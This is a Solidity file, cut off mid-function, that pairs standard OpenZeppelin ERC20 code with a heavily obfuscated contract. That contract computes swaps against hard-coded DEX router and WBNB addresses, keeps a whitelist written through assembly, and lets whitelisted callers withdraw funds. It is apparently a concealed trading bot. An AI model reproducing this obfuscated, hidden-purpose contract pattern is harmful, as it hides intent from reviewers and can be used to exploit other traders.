// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}


// File @openzeppelin/contracts/access/Ownable.sol@v4.4.0


// OpenZeppelin Contracts v4.4.0 (access/Ownable.sol)

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}


// File @openzeppelin/contracts/token/ERC20/IERC20.sol@v4.4.0


// OpenZeppelin Contracts v4.4.0 (token/ERC20/IERC20.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


// File @openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol@v4.4.0


// OpenZeppelin Contracts v4.4.0 (token/ERC20/extensions/IERC20Metadata.sol)

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


// File @openzeppelin/contracts/token/ERC20/ERC20.sol@v4.4.0

/**
 * @dev Implementation of the {IERC20} interface.
 *
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 *
 * TIP: For a detailed writeup see our guide
 * https://forum.zeppelin.solutions/t/how-to-implement-erc20-supply-mechanisms/226[How
 * to implement supply mechanisms].
 *
 * We have followed general OpenZeppelin Contracts guidelines: functions revert
 * instead returning `false` on failure. This behavior is nonetheless
 * conventional and does not conflict with the expectations of ERC20
 * applications.
 *
 * Additionally, an {Approval} event is emitted on calls to {transferFrom}.
 * This allows applications to reconstruct the allowance for all accounts just
 * by listening to said events. Other implementations of the EIP may not emit
 * these events, as it isn't required by the specification.
 *
 * Finally, the non-standard {decreaseAllowance} and {increaseAllowance}
 * functions have been added to mitigate the well-known issues around setting
 * allowances. See {IERC20-approve}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5.05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 18, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {IERC20-balanceOf} and {IERC20-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    /**
     * @dev See {IERC20-transfer}.
     *
     * Requirements:
     *
     * - `recipient` cannot be the zero address.
     * - the caller must have a balance of at least `amount`.
     */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    /**
     * @dev See {IERC20-allowance}.
     */
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-approve}.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    /**
     * @dev See {IERC20-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `amount`.
     */
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spender` cannot be the zero address.
     * - `spender` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     *
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipient` cannot be the zero address.
     * - `sender` must have a balance of at least `amount`.
     */
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing
     * the total supply.
     *
     * Emits a {Transfer} event with `from` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the
     * total supply.
     *
     * Emits a {Transfer} event with `to` set to the zero address.
     *
     * Requirements:
     *
     * - `account` cannot be the zero address.
     * - `account` must have at least `amount` tokens.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spender` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called before any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * will be transferred to `to`.
     * - when `from` is zero, `amount` tokens will be minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    /**
     * @dev Hook that is called after any transfer of tokens. This includes
     * minting and burning.
     *
     * Calling conditions:
     *
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     *
     * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
     */
    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

interface zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE {
  function factory() external view returns (address);

  function getReserves()
    external
    view
    returns (
      uint112,
      uint112,
      uint32
    );

  function swap(
    uint256,
    uint256,
    address,
    bytes calldata
  ) external;

  function mint(address) external;

  function createPair(address, address) external returns (address);
}

interface qFNdhdtL0p6EL2KDxG5E2fjxHEhne9wDoKX3JHSrKLTeS2KIlCv2HCsoNdP7HObhwvFqPKAWRq4UMZaeyTRCvYOq5a1VbK3c {
  function deposit() external payable;

  function transfer(address, uint256) external returns (bool);

  function withdraw(uint256) external;
}

contract uRNBXhCLygiVajurarNOqLc045idd8AEZBBlBptpNAo51dCgOVLSswLocNkUW5xqSUrnufWJKd8NpzbsUuIRmrSWd9YJd5HW {
  address internal constant tEFurTQiAOCBQKWG7Wbuon5JfGmUhO2LDWvG5otYIbmGSyougjHquQ1uuuT1OdCt4b7IzRiA6bKyreQ6qaq1tWdgCB2KjlES = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal constant xLZ6hd5MOWQ3jNWo3EONg6OHXa49C8hEZVUWtdGdLBqUyWkfXwdNPVNRsXiukkEwtL3YPBgHGYAJuIBtuuKQAv3EOKOYIXOF =
    0x10ED43C718714eb63d5aA57B78B54704E256024E;
  address internal yq09L09sVotRt1ziOZy6jMGr9a8uRnIsuVzmWD4OyS2zJK1BVa6Wbyne2dVrlkKQN9Frw8n6F0HqSKqjHPkZ7ThAnyafcJUJ;

  address internal constant tH6GdcFY4R73C5F3ImO7vvmzJrI0CYN9MWY7i5bRMb36Xu1Fr9WO38GNJlSDApTGwdaKQbkWr93l0eFQ8lHHMthYuKqFeRTE =
    0xE94acfa7f7DB8E84f839C75b4B986da6B781CE0a;
  address internal constant sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
  uint256 internal constant bTQjCXurhiybpX0XoulVqqIO9W1nRctSeUwyjLtuIzE1xsotr1XadKcPYzF5SMIZICQ4UhRQ4SPqas4PNbysRtH6yDJIM1fJ = 10000;
  uint256 public constant xm2HsvYjd46m30tbjqPX5bTOdpgtYRgpFHJpWEQVYphCDWkuDbpUKzGWu7yJ8oIPFnvO15oHZ2ej2Vz88od6XoLwZMlXZl3I = 25;
  uint256 internal constant gR79Ss0yvY1B9xmB7TdLRWBsI5bjLC6kJYx8IrS90WYO1IX8hi3g4IDRxkPwuqBJDVILeQbVzK2UHiHgNCOHZwZVaNxiZWUq = bTQjCXurhiybpX0XoulVqqIO9W1nRctSeUwyjLtuIzE1xsotr1XadKcPYzF5SMIZICQ4UhRQ4SPqas4PNbysRtH6yDJIM1fJ - xm2HsvYjd46m30tbjqPX5bTOdpgtYRgpFHJpWEQVYphCDWkuDbpUKzGWu7yJ8oIPFnvO15oHZ2ej2Vz88od6XoLwZMlXZl3I;

  function cyGGA5OB4fF4GhFRY5srgSTiUCyxCWfV0CSXisjb44m7KzlW2W75nAxCjP6rJShfdLjkyBq8xv86oQdzOTu5OO3meBnBigLk(
    address zjN0D3hv9CNLoH3i5jATIBYwFzoSruZvxRkNeWsS6XLH452L2WNIBupAO8LNV9weDQruulFoSkRHDVxvm3ouUG0HYKZdHZ3l,
    address oyWwsVpm1umFcSXRBf0uSkXZDLeF2yJEyjCqORWaxqT2WR2cnF93dNaC5Q8BjQjrRdNgAu4iiYeR9CVO5PL1ubcRUF1W1pWJ,
    address oo0e2JwpYAfDSKWZvKeu7HZ3au0CW3xoOZ3XXE1gGer0MtYehDmYcdfGEwRQRmuYlPOnxuhupL45B60swwNfSqvb6zo0VItb
  ) internal view returns (uint256 gyBKaK9ecaB4eWPFjOAPFxfKBFWnq3wThdTBHHA0upmRNUbmOKZFhPHm2B4kJwmjZjbFehVZoOBrkwGTDJ1bIhKSQ0YghWad, uint256 rIRVHCvbFVGXOgEPN535D9ukMwuugclMkxvTEFPhvjxLRaJyKQqdALZDwZ84UBnOC5rjQvBX8TnwXerysRXWlAgrdlRfZwlZ) {
    (uint256 pCX7Vt3CzjTb8GcDYZ0cwrrxPKnpGfRkixmlMAFdBKYWy1r2W5mjxBymxX7ERF44eS9r4D0z790cmgLCqoLoT6mKAuTNQzep, uint256 iNJBQ474FmywPXU0T3S8vCHf6Y5bWBmbDX4EM06sEje5XxhYllN9i3ByQ3AwGXc62fnWwDYfx4Z97PH6V70UYOOJRzTrmWYh, ) =
      zHOOCc5vPp2SXX8ejHFV0zgw5r7R2M7GhiOIcKwbZcLKR2scFIv1tgOXVGDNnPez8Ddlw3I1eFeRxaIQwet4MJxk8KPyVukE(zjN0D3hv9CNLoH3i5jATIBYwFzoSruZvxRkNeWsS6XLH452L2WNIBupAO8LNV9weDQruulFoSkRHDVxvm3ouUG0HYKZdHZ3l).getReserves();
    if (oyWwsVpm1umFcSXRBf0uSkXZDLeF2yJEyjCqORWaxqT2WR2cnF93dNaC5Q8BjQjrRdNgAu4iiYeR9CVO5PL1ubcRUF1W1pWJ > oo0e2JwpYAfDSKWZvKeu7HZ3au0CW3xoOZ3XXE1gGer0MtYehDmYcdfGEwRQRmuYlPOnxuhupL45B60swwNfSqvb6zo0VItb) {
      rIRVHCvbFVGXOgEPN535D9ukMwuugclMkxvTEFPhvjxLRaJyKQqdALZDwZ84UBnOC5rjQvBX8TnwXerysRXWlAgrdlRfZwlZ = pCX7Vt3CzjTb8GcDYZ0cwrrxPKnpGfRkixmlMAFdBKYWy1r2W5mjxBymxX7ERF44eS9r4D0z790cmgLCqoLoT6mKAuTNQzep;
      gyBKaK9ecaB4eWPFjOAPFxfKBFWnq3wThdTBHHA0upmRNUbmOKZFhPHm2B4kJwmjZjbFehVZoOBrkwGTDJ1bIhKSQ0YghWad = iNJBQ474FmywPXU0T3S8vCHf6Y5bWBmbDX4EM06sEje5XxhYllN9i3ByQ3AwGXc62fnWwDYfx4Z97PH6V70UYOOJRzTrmWYh;
    } else {
      rIRVHCvbFVGXOgEPN535D9ukMwuugclMkxvTEFPhvjxLRaJyKQqdALZDwZ84UBnOC5rjQvBX8TnwXerysRXWlAgrdlRfZwlZ = iNJBQ474FmywPXU0T3S8vCHf6Y5bWBmbDX4EM06sEje5XxhYllN9i3ByQ3AwGXc62fnWwDYfx4Z97PH6V70UYOOJRzTrmWYh;
      gyBKaK9ecaB4eWPFjOAPFxfKBFWnq3wThdTBHHA0upmRNUbmOKZFhPHm2B4kJwmjZjbFehVZoOBrkwGTDJ1bIhKSQ0YghWad = pCX7Vt3CzjTb8GcDYZ0cwrrxPKnpGfRkixmlMAFdBKYWy1r2W5mjxBymxX7ERF44eS9r4D0z790cmgLCqoLoT6mKAuTNQzep;
    }
  }

  function vMDxo60xXlyt9rv86wKOvTkVz79tKamHxLg7Mq7IwHVlBkqF1g9bEvsSuKXQMMZwqPXmrWTg5NvzdHxHIKwzOZtCMtaOSIUR(
    uint256 tq19hlyyKMqn6d7q2TBr8gUDhjKug2u30InIxFMPe6kxi6UYjwB2FVXF8ER6kckZDVrZpsVq3FZWNJHFC0o4cui1oLu3sKIc,
    uint256 ycobbg85lIF6yyYTNracliasi0LV4MUBUOfka1AoJmw0AAKCEt6XmPhgXaif4SAs2NZaF5kZZ0DgFFIWVpgrXjT35nrS40aw,
    uint256 k2n8oLb1wHcM39CLFtaOv4EfkAQEVAGSgGLACXPNy86Aew3PkHL11xdZuaPpnzVrT0jHGy2Z850qxJF60urYDlNOwV9k6nW9
  ) internal pure returns (uint256) {
    return (tq19hlyyKMqn6d7q2TBr8gUDhjKug2u30InIxFMPe6kxi6UYjwB2FVXF8ER6kckZDVrZpsVq3FZWNJHFC0o4cui1oLu3sKIc * gR79Ss0yvY1B9xmB7TdLRWBsI5bjLC6kJYx8IrS90WYO1IX8hi3g4IDRxkPwuqBJDVILeQbVzK2UHiHgNCOHZwZVaNxiZWUq * k2n8oLb1wHcM39CLFtaOv4EfkAQEVAGSgGLACXPNy86Aew3PkHL11xdZuaPpnzVrT0jHGy2Z850qxJF60urYDlNOwV9k6nW9) / ((ycobbg85lIF6yyYTNracliasi0LV4MUBUOfka1AoJmw0AAKCEt6XmPhgXaif4SAs2NZaF5kZZ0DgFFIWVpgrXjT35nrS40aw * bTQjCXurhiybpX0XoulVqqIO9W1nRctSeUwyjLtuIzE1xsotr1XadKcPYzF5SMIZICQ4UhRQ4SPqas4PNbysRtH6yDJIM1fJ) + (tq19hlyyKMqn6d7q2TBr8gUDhjKug2u30InIxFMPe6kxi6UYjwB2FVXF8ER6kckZDVrZpsVq3FZWNJHFC0o4cui1oLu3sKIc * gR79Ss0yvY1B9xmB7TdLRWBsI5bjLC6kJYx8IrS90WYO1IX8hi3g4IDRxkPwuqBJDVILeQbVzK2UHiHgNCOHZwZVaNxiZWUq));
  }

  function ahDqNcFSJJNEO0dfFqimha57HQT135FtVLudmINuOOwuUj3D8HXLrygno5LKppg1HBH009oDA5xJTJUk42v0FO0jDYFU78qk(uint256 v7arZuq1WvyEVv5NxOcOWSrOWIqAz13QsVOQbB81JjaKjXaMsGYjuJUfRqB15S7tZqNXoA4xLIdymXAayD9X5uEtmvJHhweP) internal view returns (address) {
    return
      address(uint160(uint256(keccak256(abi.encode(address(this), v7arZuq1WvyEVv5NxOcOWSrOWIqAz13QsVOQbB81JjaKjXaMsGYjuJUfRqB15S7tZqNXoA4xLIdymXAayD9X5uEtmvJHhweP)))));
  }

  receive() external payable {}

  fallback() external payable {}
}

abstract contract dDyh3XtbdWMkvrKUzL3lVvbnlgyauvia47ZyDjGQcJwj2fvYqlabNTSebMscfcHJ9vJyLH46NjBoBSea1WRp6TzO1UnKrk5n is uRNBXhCLygiVajurarNOqLc045idd8AEZBBlBptpNAo51dCgOVLSswLocNkUW5xqSUrnufWJKd8NpzbsUuIRmrSWd9YJd5HW {
  mapping(address => bool) internal zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv;
  uint256 internal mTMGAS6wsd6m174a1IRbzBduQC1jz6AM60QtsSayuu0WD9VqU6Oq9l1E7IET5hgqeiOFNBSJzVvdKFnnzpnVMGQIMjpW4ODQ;
  uint256 public sDo6tVImWpbAFLpS3aoBo0TW0QMg3qKF8BUarJfEjggxLkucpjGXaxBcxEBOJLMFR8UcW3aivbdqaf6Q1Ma1ZJJhyTNEtbkQ;
  uint256 internal eHLdEoyVPWAPaFSYwpKo7ngNeDLXApy9GTEEidvfqxNQRZ2QcrTXoYX9pIFgf4dE0OunbE2GuDYTV74AEvpV0hrMnRPoUqAg;

  function opUoC6KBbakzDxwnJ8bf7YCuANy6XSW9ysIO0qpZeL3vHCdRT5ZSaJtsYkLwLfyYGiCdGZ2fgd0hyEiiPx56j2q9wARJcBgW(bytes memory hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS) public {
    require(zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[msg.sender]);
    assembly {
      mstore(0x20, zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv.slot)
      for {
        mstore(0x60, mload(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS))
      } lt(0, mload(0x60)) {
        mstore(0x60, sub(mload(0x60), 0x14))
      } {
        mstore(
          0,
          mod(
            mload(add(hMsrgvqP53L2ybwFrgTyhpC7gGJUmAum4SnMST7fhPP3XtdMrkppEU2A5STMdQ0BoTHlJiyapl6lbdSXgdWspigYVfg2myZS, mload(0x60))),
            0x10000000000000000000000000000000000000000
          )
        )
        mstore(0x40, keccak256(0, 0x40))
        switch iszero(sload(mload(0x40)))
          case 1 {
            sstore(mload(0x40), 1)
          }
      }
    }
  }

  function rZUXeRyNfd7Zn3aWQ4g5Jfhwkaaion0fJVxgGPguhuvQtrR1XO3o9ftffzZ51itsPXWS7cfGPLp66NMUOuoAizoswNeW2x2s(address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, uint256 flpTgdANx1bZ2lEr6BIZKc98xVcgJJM8f4memD3AgrncyOFucK4BKRNdgsGUWNWSrubAGmtk7Y3dqnagBeP567jCFfnjbvZG) public {
    require(zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[msg.sender]);
    qFNdhdtL0p6EL2KDxG5E2fjxHEhne9wDoKX3JHSrKLTeS2KIlCv2HCsoNdP7HObhwvFqPKAWRq4UMZaeyTRCvYOq5a1VbK3c(sg2mNLCrQCN0y3SajAaJAjXMHYhYBZrzudzFesL5oa3CPs081aTiMLEa1KN6B2vMe3zlgfVmE4G9ROWAhGwvJrbakltAdxlc).withdraw(flpTgdANx1bZ2lEr6BIZKc98xVcgJJM8f4memD3AgrncyOFucK4BKRNdgsGUWNWSrubAGmtk7Y3dqnagBeP567jCFfnjbvZG);
    (bool tOF2ubbOkKFAmYG1Hop8GZs6dVigbxbpRmf9T2kcadQ7fq0fvLAXdYu9oPdxyV52n3S6rcQ6nLDFAbvXM31sWRPxzPZBcI1k, ) = nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj.call{value: flpTgdANx1bZ2lEr6BIZKc98xVcgJJM8f4memD3AgrncyOFucK4BKRNdgsGUWNWSrubAGmtk7Y3dqnagBeP567jCFfnjbvZG}("");
    require(tOF2ubbOkKFAmYG1Hop8GZs6dVigbxbpRmf9T2kcadQ7fq0fvLAXdYu9oPdxyV52n3S6rcQ6nLDFAbvXM31sWRPxzPZBcI1k, "Transfer failed.");
  }

  function w9Jc7fMShfEcxhuxEtmD90UYiRB6RxocvNZrjLXhog0ob1dQ5ZfNenOgerC2HmafXWEABO5zTYZkE9Pt6i1jBr4dVIEEg6x9(address nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj, uint256 flpTgdANx1bZ2lEr6BIZKc98xVcgJJM8f4memD3AgrncyOFucK4BKRNdgsGUWNWSrubAGmtk7Y3dqnagBeP567jCFfnjbvZG) public {
    require(zp6gNxjavWT1s5H9t60Nqs1rPb2ViytbfvmCe1ecSqCBv7zJkSWBTn3ShiEUwtVmSwQ1KHSf1l0W7afsOVmDnjA7CaXHTMLv[msg.sender]);
    (bool tOF2ubbOkKFAmYG1Hop8GZs6dVigbxbpRmf9T2kcadQ7fq0fvLAXdYu9oPdxyV52n3S6rcQ6nLDFAbvXM31sWRPxzPZBcI1k, ) = nh29IZBuJT3Um71GRR3xBRK19smfNqXu83lsRXyDt6hilO9WqUdSud16QddDK1I3H4xebkd1QnCFGdCpnQm4z1VQx2Epiblj.call{value: flpTgdANx1bZ2lEr6BIZKc98xVcgJJM8f4memD3AgrncyOFucK4BKRNdgsGUWNWSrubAGmtk7Y3dqnagBeP567jCFfnjbvZG}("");
    require(tOF2ubbOkKFAmYG1Hop8GZs6dVigbxbpRmf9T2kcadQ7fq0fvLAXdYu9oPdxyV52n3S6rcQ6nLDFAbvXM31sWRPxzPZBcI1k, "Transfer failed.");
  }

  function o7KhW9oiy1hrDnQDhiUJZIvpBVvDF5eTFGySVvnv7bHXAvzMMz3oKR5DtnGqieLADQh2yU7rs9TAdJcthinZIAVeE0tj07Af(
    address socOfWuERtGphfz30EWJTAVfzf7nmoSQp1yvTwCjXQqcjauAtuPbM9CwW7xHOFQ2SuRUPT5vWj85w0PCGlILF5DfzR8atG24,
